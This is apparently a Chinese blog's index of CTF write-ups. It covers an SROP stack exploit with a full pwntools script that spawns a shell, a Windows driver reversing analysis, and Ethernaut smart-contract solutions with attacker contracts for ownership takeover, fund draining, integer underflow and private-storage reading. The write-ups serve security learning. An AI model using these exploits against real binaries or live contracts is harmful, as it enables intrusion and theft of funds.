(0x400000) 鉴定为，没有保护。 核心代码很短： .text:00000000004011B9 vuln proc near ; CODE XREF: main+17↓p .text:00000000004011B9 .text:00000000004011B9 buf = byte ptr -10h .text:00000000004011B9 .text:00000000004011B9 ; __unwind { .text:00000000004011B9 endbr64 .text:00000000004011BD push rbp .text:00000000004011BE mov rbp, rsp .text:00000000004011C1 mov rax, 1 .text:00000000004011C8 mov rdx, 26h ; '\u0026' ; count .text:00000000004011CF lea rsi, nkctf ; \"Welcome to the binary world of NKCTF!\\n\" .text:00000000004011D7 mov rdi, rax ; fd .text:00000000004011DA syscall ; LINUX - sys_write .text:00000000004011DC xor rax, rax .text:00000000004011DF mov rdx, 200h ; count .text:00000000004011E6 lea rsi, [rsp+buf] ; buf .text:00000000004011EB mov rdi, rax ; fd .text:00000000004011EE syscall ; LINUX - sys_read .text:00000000004011F0 mov eax, 0 .text:00000000004011F5 pop rbp .text:00000000004011F6 retn .text:00000000004011F6 ; } // starts at 4011B9 .text:00000000004011F6 vuln endp 一开始以为是ret2libc，本想想办法leak地址，发现无法控制rax为1调用输出的syscall。ROPgadget发现了一些奇怪的东西： .text:0000000000401146 mov rax, 0Fh .text:000000000040114D retn .text:000000000040114E syscall ; LINUX - .text:0000000000401150 retn 查了一下，0x0F号系统调用是rt_sigreturn系统调用，推测可以使用SROP SROP是一种利用Linux信号机制的漏洞利用方法。当用户发出信号请求时，会发生这样的事情： 保存上下文（在用户态栈上）→执行信号处理函数→从信号处理函数返回→从用户栈上恢复上下文 这里的问题在于这个过程中的最后一步是通过信号处理函数调用rt_sigreturn系统调用实现的，也就是说“从用户栈上恢复上下文”这个操作可以被攻击者直接执行。 也就是说，我们只需要在用户态栈上伪造一个上下文，然后调用rt_sigreturn让系统恢复上下文即可getshell。具体来说，我们按下面的规则在栈上伪造一个上下文： rax=59 rdi = \u0026/bin/sh rsi = 0 rdx=0 rip=\u0026syscall; ret 在调用rt_sigreturn时，系统会按上面的指分别设置各个寄存器，就可以执行execve(\"/bin/sh\")了。 现在的问题是如何获得一个/bin/sh字符串。 发现程序中有一个输出welcome to nkctf的代码，如果我们在ret的时候ret到0x4011c8处，就可以跳过mov rax, 1的执行，此时rax为0，触发LINUX - read系统调用，此时我们可以在这个字符串内写入/bin/sh。 到这里思路就很明显了： ret到0x4011c8处，写入/bin/sh字符串，然后触发第二次读入。 ret到vuln()起始地址，验证/bin/sh写入是否成功，同时准备写入SigreturnFrame（可跳过） 控制ret地址为mov rax, 15; ret; syscall; ret，同时布置栈，写入伪造的SigreturnFrame。 完整exp： from pwn import * elf = ELF(\"./ez_stack\") #p = process(\"./ez_stack\") p = remote(\"node2.yuzhian.com.cn\", 39984) context.arch = 'amd64' context.log_level = 'debug' p.recvuntil(b\"NKCTF!\\n\") leak_addr = 0x4011c8 vuln_addr = 0x4011b9 nkctf_addr = 0x404040 syscall_addr = 0x40114e sigret_addr = 0x401146 payload = b\"A\" * (16+8) payload += p64(leak_addr)#write nkctf_string p.send(payload.ljust(0x200, b\"A\")) #write /bin/sh p.send(b\"/bin/sh\\x00\"+b\"a\"*(0x26-8)) #try SROP payload = b\"a\"*(16+8) + p64(vuln_addr) p.send(payload) p.recvuntil(b\"/bin/sh\\x00\"+b\"a\"*(0x26-8)) frame = SigreturnFrame() frame.rax = constants.SYS_execve frame.rdi = nkctf_addr #\u0026'/bin/sh' frame.rsi = 0 frame.rdx = 0 frame.rip = syscall_addr #print(frame) frame = b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00@@@\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00N\\x11@\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x003\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' payload = b'a'* (16+8) payload += p64(sigret_addr) #强制sigreturn，改变frame payload += p64(syscall_addr) payload += frame #payload += p64(vuln_addr) p.send(payload) p.interactive() ","date":"2023-03-29","objectID":"/srop/:0:0","tags":null,"title":"NKCTF2023ezstack - SROP初探","uri":"/srop/"},{"categories":null,"content":"with Katzebin 就不传附件了 附件有checker.exe和check_drv.sys两个文件 checker.exe逻辑十分简单 int __cdecl main(int argc, const char **argv, const char **envp) { HANDLE FileW; // rax char *v4; // rcx char OutBuffer[4]; // [rsp+40h] [rbp-18h] BYREF DWORD BytesReturned; // [rsp+44h] [rbp-14h] BYREF FileW = CreateFileW(L\"\\\\\\\\.\\\\hitcon_checker\", 0xC0000000, 0, 0i64, 3u, 4u, 0i64); qword_140003620 = (__int64)FileW; if ( FileW == (HANDLE)-1i64 ) { sub_140001010(\"driver not found\\n\"); exit(0); } OutBuffer[0] = 0; DeviceIoControl(FileW, 0x222080u, 0i64, 0, OutBuffer, 1u, \u0026BytesReturned, 0i64); v4 = \"correct\\n\"; if ( !OutBuffer[0] ) v4 = \"wrong\\n\"; sub_140001010(v4); system(\"pause\"); return 0; } https://www.cnblogs.com/lsh123/p/7354573.html 具体可以参照这篇文章，程序整体逻辑是检测设备hitcon_checker并与该设备的驱动交互。可以发现这里的交互操作只有读取，可以知道整体逻辑应该是由hitcon_checker设备发送IRP（I/O Request Package）包由驱动程序处理，根据处理结果返回正误。 但是我们没有这个设备…. 考虑对驱动程序进行分析。找到驱动程序里的dispatcher函数 __int64 __fastcall sub_1400011B0(struct _DEVICE_OBJECT *a1, __int64 a2) { ULONG Length; // esi PIO_STACK_LOCATION CurrentIrpStackLocation; // rax char v7; // cl __int64 v8; // rax int v9; // ecx Length = 0; CurrentIrpStackLocation = IoGetCurrentIrpStackLocation((PIRP)a2); if ( a1 != DeviceObject ) return 3221225473i64; if ( CurrentIrpStackLocation-\u003eMajorFunction ) { if ( CurrentIrpStackLocation-\u003eMajorFunction == 14 ) { Length = CurrentIrpStackLocation-\u003eParameters.Read.Length; switch ( CurrentIrpStackLocation-\u003eParameters.Read.ByteOffset.LowPart ) { case 0x222000u: sub_1400014D0(0i64); byte_140013190[0] = 1; break; case 0x222010u: sub_1400014D0(32i64); byte_140013191 = 1; break; case 0x222020u: sub_1400014D0(64i64); byte_140013192 = 1; break; case 0x222030u: sub_1400014D0(96i64); byte_140013193 = 1; break; case 0x222040u: sub_1400014D0(128i64); byte_140013194 = 1; break; case 0x222050u: sub_1400014D0(160i64); byte_140013195 = 1; break; case 0x222060u: sub_1400014D0(192i64); byte_140013196 = 1; break; case 0x222070u: sub_1400014D0(224i64); byte_140013197 = 1; break; case 0x222080u: if ( !Length ) goto LABEL_15; v7 = 1; v8 = 0i64; while ( byte_140013190[v8] ) { if ( ++v8 \u003e= 8 ) goto LABEL_21; } v7 = 0; LABEL_21: if ( v7 ) { v9 = dword_140003000 - 1668573544; if ( dword_140003000 == 1668573544 ) v9 = (unsigned __int16)word_140003004 - 28271; **(_BYTE **)(a2 + 24) = v9 == 0; } else { LABEL_15: **(_BYTE **)(a2 + 24) = 0; } break; default: break; } } } else { byte_140003170[(_QWORD)PsGetCurrentProcessId()] = 1; } *(_QWORD *)(a2 + 56) = Length; *(_DWORD *)(a2 + 48) = 0; IofCompleteRequest((PIRP)a2, 0); return 0i64; } 发现每一种IRP包都会对sub_140001B30的代码段进行一些修改，然后调用该函数执行对应操作。 考虑通过ida makecode解密后的函数的正常与否爆破8种IRP包的发送顺序。 key = [0x19, 0xBC, 0x8F, 0x82, 0xD0, 0x2C, 0x61, 0x34, 0xC0, 0x9F, 0xF6, 0x50, 0xD5, 0xFB, 0x0C, 0x6E, 0xD0, 0xEB, 0xE5, 0xE3, 0xCE, 0xB5, 0x4C, 0xCA, 0x45, 0xAA, 0x11, 0xB2, 0x3E, 0x62, 0x6F, 0x7D, 0xD0, 0xEB, 0xA9, 0xE3, 0xB2, 0x2F, 0x06, 0x47, 0x7C, 0x28, 0xC5, 0xDE, 0xDE, 0x1A, 0x4E, 0xD6, 0xD8, 0x2D, 0x93, 0x4F, 0x82, 0x65, 0x64, 0xFD, 0x08, 0x62, 0x4B, 0x87, 0x7E, 0x52, 0x47, 0x30, 0xB7, 0xBA, 0xD0, 0x39, 0x68, 0x53, 0x50, 0xAB, 0x20, 0xD5, 0xCA, 0x84, 0x26, 0x71, 0x6F, 0x91, 0x1B, 0x36, 0x46, 0x11, 0xA5, 0xF1, 0x4E, 0x58, 0x6C, 0x74, 0xD4, 0x9C, 0x15, 0xE2, 0x28, 0xD5, 0xD9, 0x0F, 0x3D, 0x83, 0xF3, 0xFC, 0xD1, 0x13, 0x1A, 0x62, 0x12, 0x40, 0xAA, 0xEA, 0xCD, 0xCB, 0xE1, 0xC6, 0x08, 0x81, 0x98, 0xF6, 0x68, 0x88, 0xBE, 0x23, 0xB5, 0x9E, 0x55, 0xB9, 0xE2, 0x7D, 0x5A, 0xDA, 0x39, 0x07, 0xF0, 0x2E, 0x32, 0x20, 0x59, 0x56, 0x4C, 0xB4, 0x8F, 0x3E, 0x07, 0x61, 0xD9, 0x0F, 0x2D, 0x61, 0xF1, 0x91, 0x33, 0x14, 0xCB, 0x49, 0x68, 0xFE, 0x1F, 0xD4, 0x8A, 0xFE, 0xE1, 0xC6, 0x18, 0x63, 0x9A, 0x9B, 0x8A, 0x8A, 0x7F, 0x08, 0xC3, 0xE8, 0xE1, 0xEC, 0x0B, 0x8F, 0x3B, 0x00, 0x94, 0xA5, 0x11, 0xE7, 0x47, 0x66, 0xC4, 0x9F, 0x98, 0x18, 0x70, 0xF0, 0x30, 0xF6, 0x94, 0x71, 0xB1, 0x95, 0xD1, 0xF0, 0x6F, 0xB7, 0xD9, 0x3D, 0x05, 0x9E, 0xC1, 0x53, 0x33, 0x76, 0x9B, 0x4B, 0x69, 0xCA, 0xDE, 0xFD, 0x7D, 0x67, 0xB8, 0x29, 0x2B, 0xC7, 0xC5, 0x84, 0x2C, 0xD1, 0x87, 0x87, 0xF1,","date":"2022-12-01","objectID":"/hitcon2022/:0:0","tags":null,"title":"Hitcon2022-Checker Windows驱动文件分析","uri":"/hitcon2022/"},{"categories":null,"content":"Before Start 其实很早就开始想学区块链安全了，但是因为环境炸了、Ropsten测试链关了和懒等等原因直到Hackergame的链上记忆大师题才开始上手实操区块链题。后来在强网拟态和N1CTF等比赛中由于不熟悉ctf区块链题的交互方式也是一直在鸽子。 后来看wp找到了这个仓库才开始进行一个题的做。 先从这个靶场打起 ","date":"2022-11-14","objectID":"/blockchain/:1:0","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"Fallback 其实这个题是可以通过Console交互来完成的，但是我还是想试一试用神奇的Poseidon库。 ","date":"2022-11-14","objectID":"/blockchain/:2:0","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"题目 目标：成为合约的owner并清空Balance contract Fallback { mapping(address =\u003e uint) public contributions; address payable public owner; constructor() public { owner = msg.sender; contributions[msg.sender] = 1000 * (1 ether); } modifier onlyOwner { require( msg.sender == owner, \"caller is not the owner\" ); _; } function contribute() public payable { require(msg.value \u003c 0.001 ether); contributions[msg.sender] += msg.value; if(contributions[msg.sender] \u003e contributions[owner]) { owner = msg.sender; } } function getContribution() public view returns (uint) { return contributions[msg.sender]; } function withdraw() public onlyOwner { owner.transfer(address(this).balance); } receive() external payable { require(msg.value \u003e 0 \u0026\u0026 contributions[msg.sender] \u003e 0); owner = msg.sender; } } ","date":"2022-11-14","objectID":"/blockchain/:2:1","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"题目分析 考点：fallback函数 receive() external payable { require(msg.value \u003e 0 \u0026\u0026 contributions[msg.sender] \u003e 0); owner = msg.sender; } 合约中允许包含一个未命名的函数（Fallback 函数），这个函数没有参数和返回值。 如果在调用合约时，没有函数与给定的标识匹配，Fallback 函数会被执行。 每当合约收到以太币，Fallback 函数就会被执行。 在本题的 Fallback 函数中（如上），若随交易发送的以太币msg.value和交易发送者的contribution均大于0，则可以变更合约owner。 同时，在contribute()函数中，可以为消息发送者添加很少contribution。很显然通过这个函数使contribution超过 owner 并不现实。但是这个函数可以帮助我们满足 Fallback 函数中contribution \u003e 0的限制。 ","date":"2022-11-14","objectID":"/blockchain/:2:2","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"解题思路 调用contribute()函数，附带少量以太币，满足contribution \u003e 0 向合约转账少量以太币，触发fallback函数，成为合约owner 调用withdraw()函数清空 balance 达成目标。 使用Poseidon库进行交互。（附注释） from Poseidon.Blockchain import * #连接到Sepolia测试链 chain = Chain(\"https://rpc.sepolia.org\") #用私钥创建账户实例。由于这里用的是真实的账户隐去私钥。 account = Account(chain, \"your private key\") #编译题目合约，创建合约实例 abi, bytecode = BlockchainUtils.Compile(\"fallback.sol\", \"Fallback\") contractAddress = 0xc80d2089B60231B9D045e985bCB6Fb07Fc8B543E contract = Contract(account, contractAddress, abi) #调用contribute函数。由于常规函数调用事件不能附带以太币发送，故使用自定义交易方式调用函数 Calldata = contract.EncodeABI(\"contribute\") account.SendTransaction(contract.Address, Data = Calldata, Value=1) #触发fallback函数 account.SendTransaction(contract.Address, Data = \"\", Value=1) #调用withdraw函数 contract.CallFunction(\"withdraw\") 交互日志（可以看到实际的交易事件内容） 2022-11-14 21:06:54.128 | SUCCESS | Poseidon.Blockchain:__init__:32 - [Chain][Connect]Successfully connected to [https://rpc.sepolia.org]. [Delay] 20774 ms 2022-11-14 21:06:55.198 | SUCCESS | Poseidon.Blockchain:GetBasicInformation:49 - [Chain][GetBasicInformation] [ChainId]11155111 [BlockNumber]2287892 [GasPrice]1.500000007 Gwei [ClientVersion]Geth/v1.10.21-unstable-926b3e08-20220706/linux-amd64/go1.18.1 2022-11-14 21:06:55.229 | SUCCESS | Poseidon.Blockchain:__init__:241 - [Account][Import]Successfully import account [0x7Ebd33D2e0707abD856c86C32D424122D400D9E9]. 2022-11-14 21:06:55.505 | SUCCESS | Poseidon.Blockchain:GetBalance:122 - [Chain][GetBalance][0x7Ebd33D2e0707abD856c86C32D424122D400D9E9] [44716479299591096 Wei]\u003c=\u003e[0.044716479299591096 Ether] 2022-11-14 21:06:55.559 | SUCCESS | Poseidon.Blockchain:Compile:610 - [BlockchainUtils][Compile] [FileCourse]target.sol [ContractName]Fallback [ABI][{'inputs': [], 'stateMutability': 'nonpayable', 'type': 'constructor'}, {'inputs': [], 'name': 'contribute', 'outputs': [], 'stateMutability': 'payable', 'type': 'function'}, {'inputs': [{'internalType': 'address', 'name': '', 'type': 'address'}], 'name': 'contributions', 'outputs': [{'internalType': 'uint256', 'name': '', 'type': 'uint256'}], 'stateMutability': 'view', 'type': 'function'}, {'inputs': [], 'name': 'getContribution', 'outputs': [{'internalType': 'uint256', 'name': '', 'type': 'uint256'}], 'stateMutability': 'view', 'type': 'function'}, {'inputs': [], 'name': 'owner', 'outputs': [{'internalType': 'address payable', 'name': '', 'type': 'address'}], 'stateMutability': 'view', 'type': 'function'}, {'inputs': [], 'name': 'withdraw', 'outputs': [], 'stateMutability': 'nonpayable', 'type': 'function'}, {'stateMutability': 'payable', 'type': 'receive'}] [Bytecode]608060405234801561001057600080fd5b5033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550683635c9adc5dea000006000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610515806100ad6000396000f3fe60806040526004361061004e5760003560e01c80633ccfd60b146100f257806342e94c90146101095780638da5cb5b1461016e578063d7bb99ba146101af578063f10fdf5c146101b9576100ed565b366100ed576000341180156100a1575060008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054115b6100aa57600080fd5b33600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550005b600080fd5b3480156100fe57600080fd5b506101076101e4565b005b34801561011557600080fd5b506101586004803603602081101561012c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610312565b6040518082815260200191505060405180910390f35b34801561017a57600080fd5b5061018361032a565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101b7610350565b005b3480156101c557600080fd5b506101ce610499565b6040518082815260200191505060405180910390f35b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673fffffffffffffff","date":"2022-11-14","objectID":"/blockchain/:2:3","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"CoinFlip ","date":"2022-11-14","objectID":"/blockchain/:3:0","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"题目 目标：consecutiveWins \u003e= 10 contract CoinFlip { uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.number-1)); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; if (side == _guess) { consecutiveWins++; return true; } else { consecutiveWins = 0; return false; } } } ","date":"2022-11-14","objectID":"/blockchain/:3:1","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"题目分析 考点：伪随机数 以太坊上的所有交易一定是确定性的状态转换操作，并且以一种可计算的方式进行，这意味着没有任何不确定性。所以在区块链上不存在随机性的来源。如果用可以被攻击者控制的变量作为随机数熵源，产生的随机数并不安全。 在本题中，合约用区块哈希值产生随机数，这意味着我们可以预测随机数达到连续猜对 coin 的 side 的目的。 ","date":"2022-11-14","objectID":"/blockchain/:3:2","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"解题思路 模拟随机数产生。 contract Hacker { address instance_address = 0x4A839a697814A172e18e78F46df2515D7989427c; CoinFlip c = CoinFlip(instance_address); uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function exp() public { uint256 blockValue = uint256(blockhash(block.number-1)); uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; c.flip(side); } } 调用10次exp()即可。 from Poseidon.Blockchain import * chain = Chain(\"https://rpc.sepolia.org\") account = Account(chain, \"private key\") abi, bytecode = BlockchainUtils.Compile(\"coinflip.sol\", \"Hacker\") contractAddress = \"0x4A839a697814A172e18e78F46df2515D7989427c\" #这里要在链上部署我们自己的攻击合约 Hacker = account.DeployContract(abi, bytecode, 0, contractAddress)[\"Contract\"] for i in range(10): Hacker.CallFunction(\"exp\") ","date":"2022-11-14","objectID":"/blockchain/:3:3","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"Telephone ","date":"2022-11-14","objectID":"/blockchain/:4:0","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"题目 目标：成为合约的 owner pragma solidity ^0.6.0; contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } ","date":"2022-11-14","objectID":"/blockchain/:4:1","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"题目分析 考点：tx.origin 和 msg.sender 的区别 tx.origin 指向交易的发起者地址。这个地址一定是账户地址而不是合约地址。 msg.sender 指向函数的直接调用方。这个地址可以是账户地址或合约地址。 题目中当tx.origin和msg.sender不同时，可以任意修改owner。 ","date":"2022-11-14","objectID":"/blockchain/:4:2","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"解题思路 尝试创造一个 Hacker 合约来调用changeOwner函数。 对于 Hacker 合约：tx.origin和msg.sender均为发起交易的账户地址（player）。 对于 Telephone 合约：tx.origin仍然是发起交易的账户地址，但msg.sender指向直接调用方 Hacker 合约的地址。 contract Hacker { address instance_addr = 0x3A1783388C15c9A977a63763f13A4374c6b691b2; Telephone t = Telephone(instance_addr); function exp() public { t.changeOwner(tx.origin); } } from Poseidon.Blockchain import * chain = Chain(\"https://rpc.sepolia.org\") account = Account(chain, \"key\") abi, bytecode = BlockchainUtils.Compile(\"telephone.sol\", \"Hacker\") contractAddress = \"0x3A1783388C15c9A977a63763f13A4374c6b691b2\" Hacker = account.DeployContract(abi, bytecode, 0, contractAddress)[\"Contract\"] Hacker.CallFunction(\"exp\") ","date":"2022-11-14","objectID":"/blockchain/:4:3","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"Token ","date":"2022-11-14","objectID":"/blockchain/:5:0","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"题目 目的：初始 player 的 balance 为20。尝试使 player 的 balance 超过20。 pragma solidity ^0.6.0; contract Token { mapping(address =\u003e uint) balances; uint public totalSupply; constructor(uint _initialSupply) public { balances[msg.sender] = totalSupply = _initialSupply; } function transfer(address _to, uint _value) public returns (bool) { require(balances[msg.sender] - _value \u003e= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; } function balanceOf(address _owner) public view returns (uint balance) { return balances[_owner]; } } ","date":"2022-11-14","objectID":"/blockchain/:5:1","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"题目分析 考点：整数溢出。 这里balances使用uint类型，在被减至负数时会下溢变成很大的数。 可以利用这一点绕过require(balances[msg.sender] - _value \u003e= 0); ","date":"2022-11-14","objectID":"/blockchain/:5:2","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"解题思路 尝试转出大于20的balance造成整数溢出。 from Poseidon.Blockchain import * chain = Chain(\"https://rpc.sepolia.org\") account = Account(chain, \"key\") abi, bytecode = BlockchainUtils.Compile(\"token.sol\", \"Token\") contractAddress = \"0xC2E5F52DF603B0E9EC68D893Ec497eA633362E43\" contract = Contract(account, contractAddress, abi) # 这里目标地址只要不是自己就行 contract.CallFunction(\"transfer\", contract.Address, 30) ","date":"2022-11-14","objectID":"/blockchain/:5:3","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"Delegation ","date":"2022-11-14","objectID":"/blockchain/:6:0","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"题目 目的：成为合约的owner pragma solidity ^0.6.0; contract Delegate { address public owner; constructor(address _owner) public { owner = _owner; } function pwn() public { owner = msg.sender; } } contract Delegation { address public owner; Delegate delegate; constructor(address _delegateAddress) public { delegate = Delegate(_delegateAddress); owner = msg.sender; } fallback() external { (bool result,) = address(delegate).delegatecall(msg.data); if (result) { this; } } } ","date":"2022-11-14","objectID":"/blockchain/:6:1","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"题目分析 考点：delegatecall Delegatecall 是 solidity 中的一种合约间调用方式。 与普通函数调用不同的是，Delegatecall 的上下文为调用合约而非被调用合约。 在本题中，若使 Delegation 合约使用 delegatecall 方法调用 delegate 合约，则msg.sender还是player的账户地址而不是 Delegation 合约地址 在前文fallback题中应该涉及过，调用合约里的函数的本质是向合约地址发送一笔交易，交易数据（data）为该函数的签名哈希，在Poseidon库中可以用EncodeABI获得这个签名哈希。 ","date":"2022-11-14","objectID":"/blockchain/:6:2","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"解题思路 考虑向 Delegation 合约发送一笔交易，data为pwn方法的签名哈希。 Delegation 合约中没有对应的函数方法，触发 fallback 函数。（详见前文Fallback） msg.data被原样传入 Delegate 合约，等同于进行了一次pwn方法调用，其中msg.sender依然为player的账户地址，完成owner修改。 from Poseidon.Blockchain import * chain = Chain(\"https://rpc.sepolia.org\") account = Account(chain, \"key\") abi, bytecode = BlockchainUtils.Compile(\"delegate.sol\", \"Delegate\") contractAddress = \"0xf755Cad7611EF1CacA20A0A67a77c50a36bC8D65\" contract = Contract(account, contractAddress, abi) pwndata = contract.EncodeABI(\"pwn\") account.SendTransaction(contract.Address, pwndata) ","date":"2022-11-14","objectID":"/blockchain/:6:3","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"Force ","date":"2022-11-14","objectID":"/blockchain/:7:0","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"题目 目的：尝试给合约转账 pragma solidity ^0.6.0; contract Force {/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =ø= / (______)__m_m) */} ","date":"2022-11-14","objectID":"/blockchain/:7:1","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"题目分析 考点：合约自毁强制转账 一个合约如果能通过正常渠道收钱，则要求该合约的 fallback 函数必须是 payable 的（很显然本题并不满足） 但是合约自毁的时候可以强制把该合约的钱转出 ","date":"2022-11-14","objectID":"/blockchain/:7:2","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"解题思路 创建一个合约 给这个合约打一点钱 触发合约自我销毁，强制转账给 Force 合约 contract Hacker { address instance_addr = 0x0C3C396d9E46cF0f54D65F1C1d98E62D5632686D; Force f = Force(instance_addr); function hack() payable public {} function exp() payable public { selfdestruct(0x0C3C396d9E46cF0f54D65F1C1d98E62D5632686D); } } from Poseidon.Blockchain import * abi, bytecode = BlockchainUtils.Compile(\"force.sol\", \"Hacker\") chain = Chain(\"https://rpc.sepolia.org\") account = Account(chain, \"key\") contractAddress = \"0x0C3C396d9E46cF0f54D65F1C1d98E62D5632686D\" Hacker = account.DeployContract(abi, bytecode, 0, contractAddress)[\"Contract\"] hack = Hacker.EncodeABI(\"hack\") account.SendTransaction(Hacker.Address, Data=hack, Value=1) Hacker.CallFunction(\"exp\") ","date":"2022-11-14","objectID":"/blockchain/:7:3","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"Vault ","date":"2022-11-14","objectID":"/blockchain/:8:0","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"题目 目的：locked == false pragma solidity ^0.6.0; contract Vault { bool public locked; bytes32 private password; constructor(bytes32 _password) public { locked = true; password = _password; } function unlock(bytes32 _password) public { if (password == _password) { locked = false; } } } ","date":"2022-11-14","objectID":"/blockchain/:8:1","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"题目分析 考点：private变量？ 在区块链上，所有的变量一定都是公开透明的。 private只能阻止该变量被其他合约访问，不能阻止该变量被攻击者读取 ","date":"2022-11-14","objectID":"/blockchain/:8:2","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"解题思路 用Poseidon库中的GetStorage方法读取该变量。 from Poseidon.Blockchain import * from Crypto.Util.number import long_to_bytes abi, bytecode = BlockchainUtils.Compile(\"vault.sol\", \"Vault\") chain = Chain(\"https://rpc.sepolia.org\") account = Account(chain, \"key\") contractAddress = \"0xd94964083e94B04B23f0F4a57beb0363A0982977\" contract = Contract(account, contractAddress, abi) passwd = chain.GetStorage(contract.Address, 1) passwd = long_to_bytes(int(passwd[2:], 16)) contract.CallFunction(\"unlock\", passwd) ","date":"2022-11-14","objectID":"/blockchain/:8:3","tags":null,"title":"[BlockChain] Ethernaut做题笔记（更新中）","uri":"/blockchain/"},{"categories":null,"content":"[Reverse] AmazingMFC 一整场比赛Reverse就一个题，真是被看扁了啊.jpg 附件备份 